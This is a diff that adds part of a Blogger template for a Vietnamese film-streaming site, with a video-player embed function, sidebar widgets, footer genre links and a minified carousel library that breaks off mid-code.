+if(x.indexOf(sv[37]) != -1){x = x.replace(/\#sub=/gi,"&sub="); obj = DBOj(x)[5]} //bilutv.com
+if(x.indexOf(sv[39]) != -1){x = x.replace(/\#sub=/gi,"&sub="); obj = DBOj(x)[5]} //phimbathu.com
+if(x.indexOf(sv[40]) != -1){x = x.replace(/\#sub=/gi,"&sub="); obj = DBOj(x)[5]} //anime47.com
+if(x.indexOf(sv[42]) != -1){x = x.replace(/\#sub=/gi,"&sub="); obj = DBOj(x)[5]} //fshare
+if(x.indexOf(sv[51]) != -1){x = x.replace(/\#sub=/gi,"&sub="); obj = DBOj(x)[5]} //phim14
+
+
+this.fu("anc_pl", obj)
+}; 
+   
+var DBOj = function(x){	
+rut = '<iframe width="100%" height="'+height+'" src="';
+qua = '<div id="logoplayer"></div><';
+	return obj = [
+	// 0 -.load. 
+	''+rut+'http://media-vietsubhd.rhcloud.com/pc/picasa.php?url='+x+'" scrolling="no" frameborder="0" allowfullscreen="true" id="playerayer"> </iframe>',
+	// 1 - Diver - Gdata
+	'<div id="logoplayer"></div><iframe id="playerayer"  src="'+x+'?autoplay='+eauto+'" width="'+width+'" height="'+height+'" type="application/x-shockwave-flash" allowfullscreen="true" allowScriptAccess="always" frameborder="0"/></iframe>',
+	// 2 - Zing html5 - Goo.gl
+	'<div id="logoplayer"></div><video id="playerayer" class="video-js vjs-default-skin" data-setup="{&quot;controls&quot;: true, &quot;autoplay&quot;: '+auto+', &quot;preload&quot;: &quot;auto&quot;}" width="'+width+'" height="'+height+'" poster="'+imgload+'" ><source src="'+x+'" type="video/mp4"/></video>',
+	// 3 - Driver ma hoa
+	''+rut+'https://api.blogit.vn/BITplayer/?player=jwplayer&link='+x+'" scrolling="no" frameborder="0" allowfullscreen="true" id="playerayer"> </iframe>',
+	// 4 - mphim
+	''+rut+'http://media-vietsubhd.rhcloud.com/pc/mphim.php?url='+x+'" scrolling="no" frameborder="0" allowfullscreen="true" id="playerayer"> </iframe>',
+	// 5 - get link vip
+	''+rut+'https://api.blogit.vn/BITplayer/?player=jwplayer&link='+x+'" scrolling="no" frameborder="0" allowfullscreen="true" id="playerayer"> </iframe>',
+	// 6 - zone5s
+	''+rut+'http://media-vietsubhd.rhcloud.com/pc/grapzone5s.php?url='+x+'" scrolling="no" frameborder="0" allowfullscreen="true" id="playerayer"> </iframe>',
+    // 7 - phim4v
+	''+rut+'http://media-vietsubhd.rhcloud.com/pc/phim4v.php?url='+x+'" scrolling="no" frameborder="0" allowfullscreen="true" id="playerayer"> </iframe>',
+    // 8 - phim7
+	''+rut+'http://media-vietsubhd.rhcloud.com/pc/phim7.php?url='+x+'" scrolling="no" frameborder="0" allowfullscreen="true" id="playerayer"> </iframe>',
+	// 9 - hayphimtv
+	''+rut+'http://media-vietsubhd.rhcloud.com/pc/hayphimtv.php?url='+x+'" scrolling="no" frameborder="0" allowfullscreen="true" id="playerayer"> </iframe>',
+	// 10 - Driver ma hoa
+	''+rut+'http://media-vietsubhd.rhcloud.com/pc/mahoa.php?url='+x+'" scrolling="no" frameborder="0" allowfullscreen="true" id="playerayer"> </iframe>',
+	// 11 - xemphimso
+	''+rut+'http://media-vietsubhd.rhcloud.com/pc/xemphimso.php?url='+x+'" scrolling="no" frameborder="0" allowfullscreen="true" id="playerayer"> </iframe>',
+	// 12 - mp4
+	''+rut+'http://media-vietsubhd.rhcloud.com/pc/mp4.php?url='+x+'" scrolling="no" frameborder="0" allowfullscreen="true" id="playerayer"> </iframe>',
+	// 13- zing
+	''+rut+'https://api.blogit.vn/BITplayer/?player=jwplayer&link='+x+'" scrolling="no" frameborder="0" allowfullscreen="true" id="playerayer"> </iframe>',
+	// 14 - embed
+	'<div id="logoplayer"></div>'+rut+''+x+'" scrolling="no" frameborder="0" allowfullscreen="true" id="playerayer"> </iframe>',
+	// 15 - phimmoi
+	''+rut+'http://media-vietsubhd.rhcloud.com/zip.php?url='+x+'" scrolling="no" frameborder="0" allowfullscreen="true" id="playerayer"> </iframe>',];
+}}
+var M = new ancMedia; M.Play();
+ //]]>
+</script>
+</b:if>
+<!-- POST TRANG -->	
+<b:if cond='data:blog.pageType == &quot;static_page&quot;'>
+<div class='block-title breadcrumb'>
+<li><a href='/' itemprop='url' title='Trang chủ'>
+<span itemprop='title'><i class='fa fa-home'/> Trang chủ <i class='fa fa-angle-right'/></span></a></li>
+<li><a class='current' href='' title='Phim mới'><data:post.title/></a></li>
+</div>
+<div class='block-body'>
+<div class='list-film row'>
+<data:post.body/>
+</div>		
+</div> 			
+</b:if>	
+		
+</b:includable>
+    <b:includable id='postQuickEdit' var='post'>
+</b:includable>
+    <b:includable id='shareButtons' var='post'>
+</b:includable>
+    <b:includable id='status-message'>
+	<b:if cond='data:numPosts == 0'>
+<div id='ersearch'>
+<data:navMessage/>
+</div>
+</b:if>
+</b:includable>
+    <b:includable id='threaded-comment-form' var='post'>
+</b:includable>
+    <b:includable id='threaded_comment_js' var='post'>
+</b:includable>
+    <b:includable id='threaded_comments' var='post'>
+</b:includable>
+  </b:widget>
+</b:section>
+</div>
+<div class='sidebar col-lg-4 col-md-4 col-sm-5'>
+<div class='block fanpage'>
+<iframe allowtransparency='true' frameborder='0' height='214' scrolling='no' src='https://www.facebook.com/plugins/page.php?href=https%3A%2F%2Fwww.facebook.com%2Fhay.bphim%2F&amp;tabs&amp;width=287&amp;height=214&amp;small_header=false&amp;adapt_container_width=true&amp;hide_cover=false&amp;show_facepile=true&amp;appId=555112581308142' style='border: none; overflow: hidden;' width='287'/>
+</div>
+<div class='block ad_location' id='ads_location'>
+<img src='http://i.imgur.com/K9FnrNy.jpg'/>
+</div>
+<div class='block interested'>
+<div class='widget-title'>
+                                <h3 class='title'>Phim hot tuần</h3> 
+                                <span class='tabs'><div class='tab active' data-name='lew' data-target='.block.interested .content'><div class='name'><a href='phim-le/' title='Phim lẻ'>Phim lẻ</a></div></div>
+                                <div class='tab' data-name='bow' data-target='.block.interested .content'><div class='name'><a href='phim-bo/' title='Phim bộ'>Phim bộ</a></div></div>
+                                 </span></div>
+<div class='block-body'>
+<div class='content' data-name='lew'>
+<div class='list-film-simple'>
+<script>document.write(&quot;&lt;script src=\&quot;/feeds/posts/default/-/Ecchi?max-results=&quot;+10+&quot;&amp;orderby=published&amp;alt=json-in-script&amp;callback=topview\&quot;&gt;&lt;\/script&gt;&quot;);</script>
+</div>
+</div>
+<div class='content hidden' data-name='bow'>
+<div class='list-film-simple'>
+<script>document.write(&quot;&lt;script src=\&quot;/feeds/posts/default/-/Anime?max-results=&quot;+10+&quot;&amp;orderby=published&amp;alt=json-in-script&amp;callback=topview\&quot;&gt;&lt;\/script&gt;&quot;);</script>
+</div>
+</div>
+</div>
+<div class='block announcement'>
+                            <div class='widget-title'>
+     							<h3 class='title'>Thông báo</h3> 
+								</div> 
+                            <div class='block-body'>
+                                <div class='announcement-list'>+ Nếu xem phim bị lỗi, hãy chọn server <b>Dự phòng</b> hoặc <b>Comment</b>(nếu có) để admin sửa nhanh . Thanks :D<br/>
++ Vì lý do duy trì kinh phí nên website quyết định đặt quảng cáo <b><i style='color: rgb(228, 213, 104);'>popup under</i></b>. Mong mọi người thông cảm ạ! :)<br/>
+                                  + Các bạn đăng ký thành viên để đăng phim cho mọi người cùng xem <br/>
+<b>+ <i style='color: rgb(0, 255, 228);'>Đăng nhập để giảm thiếu quảng cáo trên site!</i></b>
+</div>
+                            </div>
+                        </div>
+<div class='block tagcloud'>
+                            <div class='widget-title'>
+     							<h3 class='title'>Từ khóa phổ biến</h3> 
+								</div> 
+                            <div class='block-body'>
+                                <ul>
+
+                                        <li><a href='https://www.phimhayplus.com/tag/huyền-thoại-biển-xanh/' title='huyền thoại biển xanh'>huyền thoại biển xanh</a></li>
+    <li><a href='https://www.phimhayplus.com/tag/the-legend-of-the-blue-sea-2016/' title='the legend of the blue sea 2016'>the legend of the blue sea 2016</a></li>
+    <li><a href='https://www.phimhayplus.com/tag/tình-chàng-yêu-tinh/' title='tình chàng yêu tinh'>tình chàng yêu tinh</a></li>
+    <li><a href='https://www.phimhayplus.com/tag/the-lonely/' title='the lonely'>the lonely</a></li>
+    <li><a href='https://www.phimhayplus.com/tag/shining-goblin-2016/' title='shining goblin 2016'>shining goblin 2016</a></li>
+    <li><a href='https://www.phimhayplus.com/tag/7-nụ-hôn-Đầu/' title='7 nụ hôn Đầu'>7 nụ hôn Đầu</a></li>
+    <li><a href='https://www.phimhayplus.com/tag/first-kiss-for-the-seventh-time-2016/' title='first kiss for the seventh time 2016'>first kiss for the seventh time 2016</a></li>
+    <li><a href='https://www.phimhayplus.com/tag/7-nu-hon-dau/' title='7 nu hon dau'>7 nu hon dau</a></li>
+    <li><a href='https://www.phimhayplus.com/tag/phi-Đao-hựu-kiến-phi-Đao/' title='phi Đao hựu kiến phi Đao'>phi Đao hựu kiến phi Đao</a></li>
+    <li><a href='https://www.phimhayplus.com/tag/the-legend-of-flying-daggers-2016/' title='the legend of flying daggers 2016'>the legend of flying daggers 2016</a></li>
+    <li><a href='https://www.phimhayplus.com/tag/tru-tiên-2/' title='tru tiên 2'>tru tiên 2</a></li>
+    <li><a href='https://www.phimhayplus.com/tag/thanh-vân-chí-2-2016/' title='thanh vân chí 2 2016'>thanh vân chí 2 2016</a></li>
+    <li><a href='https://www.phimhayplus.com/tag/tru-tien-2/' title='tru tien 2'>tru tien 2</a></li>
+    <li><a href='https://www.phimhayplus.com/tag/cô-nàng-cử-tạ/' title='cô nàng cử tạ'>cô nàng cử tạ</a></li>
+    <li><a href='https://www.phimhayplus.com/tag/kim-bok-joo/' title='kim bok joo'>kim bok joo</a></li>
+    <li><a href='https://www.phimhayplus.com/tag/weightlifting-fairy-kim-bok-joo-2016/' title='weightlifting fairy kim bok joo 2016'>weightlifting fairy kim bok joo 2016</a></li>
+                                </ul>
+                            </div>
+                        </div>
+</div>
+</div>
+</div>
+</div>
+<div class='clear'/>
+<div id='footer'>
+ <div class='container'>
+<div class='row'>
+<div class='col-lg-9 col-md-9 col-sm-9 col-xs-12'>
+<div class='col-lg-3 col-md-3 col-sm-3 col-xs-3'>
+<ul>
+<li><a href='http://www.phimhayplus.com/the-loai/adult/' title='Phim 18+'>Phim 18+</a></li>
+<li><a href='http://www.phimhayplus.com/the-loai/truyen-hinh/' title='Truyền hình'>Truyền hình</a></li>
+<li><a href='http://www.phimhayplus.com/the-loai/anime/' title='Anime'>Anime</a></li>
+<li><a href='http://www.phimhayplus.com/the-loai/kinh-di/' title='Kinh Dị'>Kinh Dị</a></li>
+<li><a href='http://www.phimhayplus.com/the-loai/lang-man/' title='Lãng mạn'>Lãng mạn</a></li>
+<li><a href='http://www.phimhayplus.com/the-loai/hanh-dong/' title='Hành Động'>Hành Động</a></li>
+<li><a href='http://www.phimhayplus.com/the-loai/tam-ly/' title='Tâm Lý'>Tâm Lý</a></li>
+</ul>
+</div>
+<div class='col-lg-3 col-md-3 col-sm-3 col-xs-3'>
+<ul>
+<li><a href='http://www.phimhayplus.com/the-loai/tai-lieu/' title='Tài liệu'>Tài liệu</a></li>
+<li><a href='http://www.phimhayplus.com/the-loai/tinh-cam/' title='Tình Cảm'>Tình Cảm</a></li>
+<li><a href='http://www.phimhayplus.com/the-loai/phieu-luu/' title='Phiêu Lưu'>Phiêu Lưu</a></li>
+<li><a href='http://www.phimhayplus.com/the-loai/hoat-hinh/' title='Hoạt Hình'>Hoạt Hình</a></li>
+<li><a href='http://www.phimhayplus.com/the-loai/vo-thuat/' title='Võ Thuật'>Võ Thuật</a></li>
+<li><a href='http://www.phimhayplus.com/the-loai/hai-huoc/' title='Hài Hước'>Hài Hước</a></li>
+<li><a href='http://www.phimhayplus.com/the-loai/am-nhac/' title='Âm nhạc'>Âm nhạc</a></li>
+</ul>
+</div>
+<div class='col-lg-3 col-md-3 col-sm-3 col-xs-3'>
+<ul>
+<li><a href='http://www.phimhayplus.com/the-loai/hinh-su/' title='Hình Sự'>Hình Sự</a></li>
+<li><a href='http://www.phimhayplus.com/the-loai/gia-dinh/' title='Gia đình'>Gia đình</a></li>
+<li><a href='http://www.phimhayplus.com/the-loai/vien-tuong/' title='Viễn Tưởng'>Viễn Tưởng</a></li>
+<li><a href='http://www.phimhayplus.com/the-loai/than-thoai/' title='Thần Thoại'>Thần Thoại</a></li>
+<li><a href='http://www.phimhayplus.com/the-loai/chien-tranh/' title='Chiến Tranh'>Chiến Tranh</a></li>
+<li><a href='http://www.phimhayplus.com/the-loai/show/' title='Shows'>Shows</a></li>
+<li><a href='http://www.phimhayplus.com/the-loai/co-trang/' title='Cổ Trang'>Cổ Trang</a></li>
+</ul>
+</div>
+<div class='col-lg-3 col-md-3 col-sm-3 col-xs-3'>
+<ul>
+<li><a href='sitemap.xml'>Sitemap</a></li>
+<li><a href='rss'>Rss</a></li>
+<li><a rel='noffolow'>Your IP:</a>
+</li><li><a rel='noffolow'/></li>
+</ul>
+</div>
+</div>
+<div class='col-lg-3 col-md-3 col-sm-3 col-xs-12'>
+<ul class='list-contact'>
+<li><a href='#' id='logo-footer'><img src='https://www.phimhayplus.com/statics/defaultv2/images/logo.png'/></a></li>
+<li><a href='#'>Hỏi đáp - Hướng dẫn</a></li>
+<li><a href='#'>Điều khoản sử dụng</a></li>
+<li><a href='#'>Chính sách riêng tư</a></li>
+<li><a href='#'>Nguyên tắc Cộng Đồng</a></li>
+<li><a href='#'>Liên hệ Quảng Cáo</a></li>
+<li><a href='http://www.fansubvn.com' id='copyright' ref='nofollow'>Xem Anime FansubVn</a></li>
+</ul>
+</div>
+</div>
+ </div>
+ <div class='back-to-top show' id='back-to-top' title='Back to top'><i class='fa fa-chevron-up'/></div>
+ <div style='text-align: center; color: #FFF'>Copyright &#169;2016 PHIMHAYPLUS.COM. All Rights Reserved.</div>
+</div>
+
+</div>
+
+<script src='https://www.phimhayplus.com/statics/defaultv2/js/jquery-2.1.0.min.js' type='text/javascript'/>
+<script src='https://www.phimhayplus.com/statics/defaultv2/js/jquery.bootstrap-growl.min.js' type='text/javascript'/>
+<script src='https://www.phimhayplus.com/statics/defaultv2/js/jquery.magnific-popup.min.js' type='text/javascript'/>
+<script src='https://www.phimhayplus.com/statics/defaultv2/js/pl.notie.js' type='text/javascript'/>
+<script src='https://www.phimhayplus.com/statics/defaultv2/js/jquery.cookie.js' type='text/javascript'/>
+<script src='https://www.phimhayplus.com/statics/defaultv2/js/pl.public.js' type='text/javascript'/>
+<script src='https://www.phimhayplus.com/statics/defaultv2/js/jquery.cookie.js' type='text/javascript'/>
+<script src='https://www.phimhayplus.com/statics/defaultv2/js/slick.min.js' type='text/javascript'/>
+<script src='https://www.phimhayplus.com/statics/defaultv2/js/bootstrap.js'/>
+<script src='https://www.phimhayplus.com/statics/defaultv2/js/owl.carousel.min.js' type='text/javascript'/>
+
+<script> 
+//<![CDATA[
+"function"!==typeof Object.create&&(Object.create=function(f){function g(){}g.prototype=f;return new g});(function(f,g,k){var l={init:function(a,b){this.$elem=f(b);this.options=f.extend({},f.fn.owlCarousel.options,this.$elem.data(),a);this.userOptions=a;this.loadContent()},loadContent:function(){function a(a){var d,e="";if("function"===typeof b.options.jsonSuccess)b.options.jsonSuccess.apply(this,[a]);else{for(d in a.owl)a.owl.hasOwnProperty(d)&&(e+=a.owl[d].item);b.$elem.html(e)}b.logIn()}var b=this,e;"function"===typeof b.options.beforeInit&&b.options.beforeInit.apply(this,[b.$elem]);"string"===typeof b.options.jsonPath?(e=b.options.jsonPath,f.getJSON(e,a)):b.logIn()},logIn:function(){this.$elem.data("owl-originalStyles",this.$elem.attr("style"));this.$elem.data("owl-originalClasses",this.$elem.attr("class"));this.$elem.css({opacity:0});this.orignalItems=this.options.items;this.checkBrowser();this.wrapperWidth=0;this.checkVisible=null;this.setVars()},setVars:function(){if(0===this.$elem.children().length)return!1;this.baseClass();this.eventTypes();this.$userItems=this.$elem.children();this.itemsAmount=this.$userItems.length;this.wrapItems();this.$owlItems=this.$elem.find(".owl-item");this.$owlWrapper=this.$elem.find(".owl-wrapper");this.playDirection="next";this.prevItem=0;this.prevArr=[0];this.currentItem=0;this.customEvents();this.onStartup()},onStartup:function(){this.updateItems();this.calculateAll();this.buildControls();this.updateControls();this.response();this.moveEvents();this.stopOnHover();this.owlStatus();!1!==this.options.transitionStyle&&this.transitionTypes(this.options.transitionStyle);!0===this.options.autoPlay&&(this.options.autoPlay=5E3);this.play();this.$elem.find(".owl-wrapper").css("display","block");this.$elem.is(":visible")?this.$elem.css("opacity",1):this.watchVisibility();this.onstartup=!1;this.eachMoveUpdate();"function"===typeof this.options.afterInit&&this.options.afterInit.apply(this,[this.$elem])},eachMoveUpdate:function(){!0===this.options.lazyLoad&&this.lazyLoad();!0===this.options.autoHeight&&this.autoHeight();this.onVisibleItems();"function"===typeof this.options.afterAction&&this.options.afterAction.apply(this,[this.$elem])},updateVars:function(){"function"===typeof this.options.beforeUpdate&&this.options.beforeUpdate.apply(this,[this.$elem]);this.watchVisibility();this.updateItems();this.calculateAll();this.updatePosition();this.updateControls();this.eachMoveUpdate();"function"===typeof this.options.afterUpdate&&this.options.afterUpdate.apply(this,[this.$elem])},reload:function(){var a=this;g.setTimeout(function(){a.updateVars()},0)},watchVisibility:function(){var a=this;if(!1===a.$elem.is(":visible"))a.$elem.css({opacity:0}),g.clearInterval(a.autoPlayInterval),g.clearInterval(a.checkVisible);else return!1;a.checkVisible=g.setInterval(function(){a.$elem.is(":visible")&&(a.reload(),a.$elem.animate({opacity:1},200),g.clearInterval(a.checkVisible))},500)},wrapItems:function(){this.$userItems.wrapAll('<div class="owl-wrapper">').wrap('<div class="owl-item"></div>');this.$elem.find(".owl-wrapper").wrap('<div class="owl-wrapper-outer">');this.wrapperOuter=this.$elem.find(".owl-wrapper-outer");this.$elem.css("display","block")},baseClass:function(){var a=this.$elem.hasClass(this.options.baseClass),b=this.$elem.hasClass(this.options.theme);a||this.$elem.addClass(this.options.baseClass);b||this.$elem.addClass(this.options.theme)},updateItems:function(){var a,b;if(!1===this.options.responsive)return!1;if(!0===this.options.singleItem)return this.options.items=this.orignalItems=1,this.options.itemsCustom=!1,this.options.itemsDesktop=!1,this.options.itemsDesktopSmall=!1,this.options.itemsTablet=!1,this.options.itemsTabletSmall=!1,this.options.itemsMobile=!1;a=f(this.options.responsiveBaseWidth).width();a>(this.options.itemsDesktop[0]||this.orignalItems)&&(this.options.items=this.orignalItems);if(!1!==this.options.itemsCustom)for(this.options.itemsCustom.sort(function(a,b){return a[0]-b[0]}),b=0;b<this.options.itemsCustom.length;b+=1)this.options.itemsCustom[b][0]<=a&&(this.options.items=this.options.itemsCustom[b][1]);else a<=this.options.itemsDesktop[0]&&!1!==this.options.itemsDesktop&&(this.options.items=this.options.itemsDesktop[1]),a<=this.options.itemsDesktopSmall[0]&&!1!==this.options.itemsDesktopSmall&&(this.options.items=this.options.itemsDesktopSmall[1]),a<=this.options.itemsTablet[0]&&!1!==this.options.itemsTablet&&(this.options.items=this.options.itemsTablet[1]),a<=this.options.itemsTabletSmall[0]&&!1!==this.options.itemsTabletSmall&&(this.options.items=this.options.itemsTabletSmall[1]),a<=this.options.itemsMobile[0]&&!1!==this.options.itemsMobile&&(this.options.items=this.options.itemsMobile[1]);this.options.items>this.itemsAmount&&!0===this.options.itemsScaleUp&&(this.options.items=this.itemsAmount)},response:function(){var a=this,b,e;if(!0!==a.options.responsive)return!1;e=f(g).width();a.resizer=function(){f(g).width()!==e&&(!1!==a.options.autoPlay&&g.clearInterval(a.autoPlayInterval),g.clearTimeout(b),b=g.setTimeout(function(){e=f(g).width();a.updateVars()},a.options.responsiveRefreshRate))};f(g).resize(a.resizer)},updatePosition:function(){this.jumpTo(this.currentItem);!1!==this.options.autoPlay&&this.checkAp()},appendItemsSizes:function(){var a=this,b=0,e=a.itemsAmount-a.options.items;a.$owlItems.each(function(c){var d=f(this);d.css({width:a.itemWidth}).data("owl-item",Number(c));if(0===c%a.options.items||c===e)c>e||(b+=1);d.data("owl-roundPages",b)})},appendWrapperSizes:function(){this.$owlWrapper.css({width:this.$owlItems.length*this.itemWidth*2,left:0});this.appendItemsSizes()},calculateAll:function(){this.calculateWidth();this.appendWrapperSizes();this.loops();this.max()},calculateWidth:function(){this.itemWidth=Math.round(this.$elem.width()/this.options.items)},max:function(){var a=-1*(this.itemsAmount*this.itemWidth-this.options.items*this.itemWidth);this.options.items>this.itemsAmount?this.maximumPixels=a=this.maximumItem=0:(this.maximumItem=this.itemsAmount-this.options.items,this.maximumPixels=a);return a},min:function(){return 0},loops:function(){var a=0,b=0,e,c;this.positionsInArray=[0];this.pagesInArray=[];for(e=0;e<this.itemsAmount;e+=1)b+=this.itemWidth,this.positionsInArray.push(-b),!0===this.options.scrollPerPage&&(c=f(this.$owlItems[e]),c=c.data("owl-roundPages"),c!==a&&(this.pagesInArray[a]=this.positionsInArray[e],a=c))},buildControls:function(){if(!0===this.options.navigation||!0===this.options.pagination)this.owlControls=f('<div class="owl-controls"/>').toggleClass("clickable",!this.browser.isTouch).appendTo(this.$elem);!0===this.options.pagination&&this.buildPagination();!0===this.options.navigation&&this.buildButtons()},buildButtons:function(){var a=this,b=f('<div class="owl-buttons"/>');a.owlControls.append(b);a.buttonPrev=f("<div/>",{"class":"owl-prev",html:a.options.navigationText[0]||""});a.buttonNext=f("<div/>",{"class":"owl-next",html:a.options.navigationText[1]||""});b.append(a.buttonPrev).append(a.buttonNext);b.on("touchstart.owlControls mousedown.owlControls",'div[class^="owl"]',function(a){a.preventDefault()});b.on("touchend.owlControls mouseup.owlControls",'div[class^="owl"]',function(b){b.preventDefault();f(this).hasClass("owl-next")?a.next():a.prev()})},buildPagination:function(){var a=this;a.paginationWrapper=f('<div class="owl-pagination"/>');a.owlControls.append(a.paginationWrapper);a.paginationWrapper.on("touchend.owlControls mouseup.owlControls",".owl-page",function(b){b.preventDefault();Number(f(this).data("owl-page"))!==a.currentItem&&a.goTo(Number(f(this).data("owl-page")),!0)})},updatePagination:function(){var a,b,e,c,d,g;if(!1===this.options.pagination)return!1;this.paginationWrapper.html("");a=0;b=this.itemsAmount-this.itemsAmount%this.options.items;for(c=0;c<this.itemsAmount;c+=1)0===c%this.options.items&&(a+=1,b===c&&(e=this.itemsAmount-this.options.items),d=f("<div/>",{"class":"owl-page"}),g=f("<span></span>",{text:!0===this.options.paginationNumbers?a:"","class":!0===this.options.paginationNumbers?"owl-numbers":""}),d.append(g),d.data("owl-page",b===c?e:c),d.data("owl-roundPages",a),this.paginationWrapper.append(d));this.checkPagination()},checkPagination:function(){var a=this;if(!1===a.options.pagination)return!1;a.paginationWrapper.find(".owl-page").each(function(){f(this).data("owl-roundPages")===f(a.$owlItems[a.currentItem]).data("owl-roundPages")&&(a.paginationWrapper.find(".owl-page").removeClass("active"),f(this).addClass("active"))})},checkNavigation:function(){if(!1===this.options.navigation)return!1;!1===this.options.rewindNav&&(0===this.currentItem&&0===this.maximumItem?(this.buttonPrev.addClass("disabled"),this.buttonNext.addClass("disabled")):0===this.currentItem&&0!==this.maximumItem?(this.buttonPrev.addClass("disabled"),this.buttonNext.removeClass("disabled")):this.currentItem===this.maximumItem?(this.buttonPrev.removeClass("disabled"),this.buttonNext.addClass("disabled")):0!==this.currentItem&&this.currentItem!==this.maximumItem&&(this.buttonPrev.removeClass("disabled"),this.buttonNext.removeClass("disabled")))},updateControls:function(){this.updatePagination();this.checkNavigation();this.owlControls&&(this.options.items>=this.itemsAmount?this.owlControls.hide():this.owlControls.show())},destroyControls:function(){this.owlControls&&this.owlControls.remove()},next:function(a){if(this.isTransition)return!1;this.currentItem+=!0===this.options.scrollPerPage?this.options.items:1;if(this.currentItem>this.maximumItem+(!0===this.options.scrollPerPage?this.options.items-1:0))if(!0===this.options.rewindNav)this.currentItem=0,a="rewind";else return this.currentItem=this.maximumItem,!1;this.goTo(this.currentItem,a)},prev:function(a){if(this.isTransition)return!1;this.currentItem=!0===this.options.scrollPerPage&&0<this.currentItem&&this.currentItem<this.options.items?0:this.currentItem-(!0===this.options.scrollPerPage?this.options.items:1);if(0>this.currentItem)if(!0===this.options.rewindNav)this.currentItem=this.maximumItem,a="rewind";else return this.currentItem=0,!1;this.goTo(this.currentItem,a)},goTo:function(a,b,e){var c=this;if(c.isTransition)return!1;"function"===typeof c.options.beforeMove&&c.options.beforeMove.apply(this,[c.$elem]);a>=c.maximumItem?a=c.maximumItem:0>=a&&(a=0);c.currentItem=c.owl.currentItem=a;if(!1!==c.options.transitionStyle&&"drag"!==e&&1===c.options.items&&!0===c.browser.support3d)return c.swapSpeed(0),!0===c.browser.support3d?c.transition3d(c.positionsInArray[a]):c.css2slide(c.positionsInArray[a],1),c.afterGo(),c.singleItemTransition(),!1;a=c.positionsInArray[a];!0===c.browser.support3d?(c.isCss3Finish=!1,!0===b?(c.swapSpeed("paginationSpeed"),g.setTimeout(function(){c.isCss3Finish=!0},c.options.paginationSpeed)):"rewind"===b?(c.swapSpeed(c.options.rewindSpeed),g.setTimeout(function(){c.isCss3Finish=!0},c.options.rewindSpeed)):(c.swapSpeed("slideSpeed"),g.setTimeout(function(){c.isCss3Finish=!0},c.options.slideSpeed)),c.transition3d(a)):!0===b?c.css2slide(a,c.options.paginationSpeed):"rewind"===b?c.css2slide(a,c.options.rewindSpeed):c.css2slide(a,c.options.slideSpeed);c.afterGo()},jumpTo:function(a){"function"===typeof this.options.beforeMove&&this.options.beforeMove.apply(this,[this.$elem]);a>=this.maximumItem||-1===a?a=this.maximumItem:0>=a&&(a=0);this.swapSpeed(0);!0===this.browser.support3d?this.transition3d(this.positionsInArray[a]):this.css2slide(this.positionsInArray[a],1);this.currentItem=this.owl.currentItem=a;this.afterGo()},afterGo:function(){this.prevArr.push(this.currentItem);this.prevItem=this.owl.prevItem=this.prevArr[this.prevArr.length-2];this.prevArr.shift(0);this.prevItem!==this.currentItem&&(this.checkPagination(),this.checkNavigation(),this.eachMoveUpdate(),!1!==this.options.autoPlay&&this.checkAp());"function"===typeof this.options.afterMove&&this.prevItem!==this.currentItem&&this.options.afterMove.apply(this,[this.$elem])},stop:function(){this.apStatus="stop";g.clearInterval(this.autoPlayInterval)},checkAp:function(){"stop"!==this.apStatus&&this.play()},play:function(){var a=this;a.apStatus="play";if(!1===a.options.autoPlay)return!1;g.clearInterval(a.autoPlayInterval);a.autoPlayInterval=g.setInterval(function(){a.next(!0)},a.options.autoPlay)},swapSpeed:function(a){"slideSpeed"===a?this.$owlWrapper.css(this.addCssSpeed(this.options.slideSpeed)):"paginationSpeed"===a?this.$owlWrapper.css(this.addCssSpeed(this.options.paginationSpeed)):"string"!==typeof a&&this.$owlWrapper.css(this.addCssSpeed(a))},addCssSpeed:function(a){return{"-webkit-transition":"all "+a+"ms ease","-moz-transition":"all "+a+"ms ease","-o-transition":"all "+a+"ms ease",transition:"all "+a+"ms ease"}},removeTransition:function(){return{"-webkit-transition":"","-moz-transition":"","-o-transition":"",transition:""}},doTranslate:function(a){return{"-webkit-transform":"translate3d("+a+"px, 0px, 0px)","-moz-transform":"translate3d("+a+"px, 0px, 0px)","-o-transform":"translate3d("+a+"px, 0px, 0px)","-ms-transform":"translate3d("+a+"px, 0px, 0px)",transform:"translate3d("+a+"px, 0px,0px)"}},transition3d:function(a){this.$owlWrapper.css(this.doTranslate(a))},css2move:function(a){this.$owlWrapper.css({left:a})},css2slide:function(a,b){var e=this;e.isCssFinish=!1;e.$owlWrapper.stop(!0,!0).animate({left:a},{duration:b||e.options.slideSpeed,complete:function(){e.isCssFinish=!0}})},checkBrowser:function(){var a=k.createElement("div");a.style.cssText="  -moz-transform:translate3d(0px, 0px, 0px); -ms-transform:translate3d(0px, 0px, 0px); -o-transform:translate3d(0px, 0px, 0px); -webkit-transform:translate3d(0px, 0px, 0px); transform:translate3d(0px, 0px, 0px)";a=a.style.cssText.match(/translate3d\(0px, 0px, 0px\)/g);this.browser={support3d:null!==a&&1===a.length,isTouch:"ontouchstart"in g||g.navigator.msMaxTouchPoints}},moveEvents:function(){if(!1!==this.options.mouseDrag||!1!==this.options.touchDrag)this.gestures(),this.disabledEvents()},eventTypes:function(){var a=["s","e","x"];this.ev_types={};!0===this.options.mouseDrag&&!0===this.options.touchDrag?a=["touchstart.owl mousedown.owl","touchmove.owl mousemove.owl","touchend.owl touchcancel.owl mouseup.owl"]:!1===this.options.mouseDrag&&!0===this.options.touchDrag?a=["touchstart.owl","touchmove.owl","touchend.owl touchcancel.owl"]:!0===this.options.mouseDrag&&!1===this.options.touchDrag&&(a=["mousedown.owl","mousemove.owl","mouseup.owl"]);this.ev_types.start=a[0];this.ev_types.move=a[1];this.ev_types.end=a[2]},disabledEvents:function(){this.$elem.on("dragstart.owl",function(a){a.preventDefault()});this.$elem.on("mousedown.disableTextSelect",function(a){return f(a.target).is("input, textarea, select, option")})},gestures:function(){function a(a){if(void 0!==a.touches)return{x:a.touches[0].pageX,y:a.touches[0].pageY};if(void 0===a.touches){if(void 0!==a.pageX)return{x:a.pageX,y:a.pageY};if(void 0===a.pageX)return{x:a.clientX,y:a.clientY}}}function b(a){"on"===a?(f(k).on(d.ev_types.move,e),f(k).on(d.ev_types.end,c)):"off"===a&&(f(k).off(d.ev_types.move),f(k).off(d.ev_types.end))}function e(b){b=b.originalEvent||b||g.event;d.newPosX=a(b).x-h.offsetX;d.newPosY=a(b).y-h.offsetY;d.newRelativeX=d.newPosX-h.relativePos;"function"===typeof d.options.startDragging&&!0!==h.dragging&&0!==d.newRelativeX&&(h.dragging=!0,d.options.startDragging.apply(d,[d.$elem]));(8<d.newRelativeX||-8>d.newRelativeX)&&!0===d.browser.isTouch&&(void 